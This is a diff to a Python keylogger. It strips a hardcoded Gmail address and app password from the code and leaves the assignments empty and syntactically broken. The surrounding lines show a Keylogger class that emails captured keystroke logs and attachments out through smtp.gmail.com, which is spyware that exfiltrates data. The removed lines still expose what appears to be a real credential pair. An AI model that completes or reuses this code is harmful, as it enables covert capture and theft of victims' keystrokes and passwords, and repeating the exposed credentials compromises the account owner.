@@ -11,8 +11,8 @@ import threading
 from threading import Timer
 from datetime import datetime
 
-EMAIL_ADDRESS = "jezus459@gmail.com"
-EMAIL_PASSWORD = "qlrduwivghvzbmwr"
+EMAIL_ADDRESS = 
+EMAIL_PASSWORD = 
 class Keylogger:
     def __init__(self):
         self.log = ""
@@ -59,7 +59,7 @@ class Keylogger:
                     break
 
     def send(self,message):
-        password = "qlrduwivghvzbmwr"
+        password = 
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.ehlo()
         server.starttls()
@@ -72,7 +72,7 @@ class Keylogger:
     def send_email_dane(self,dane, log):
         # Setting up MIME
         message = MIMEMultipart()
-        message['From'] = "jezus459@gmail.com"
+        message['From'] = 
         message['Subject'] = log
         message.attach(MIMEText(f'{message["Subject"]} are located in this file: ', 'plain'))
         payload = MIMEBase('application', 'octate-stream')
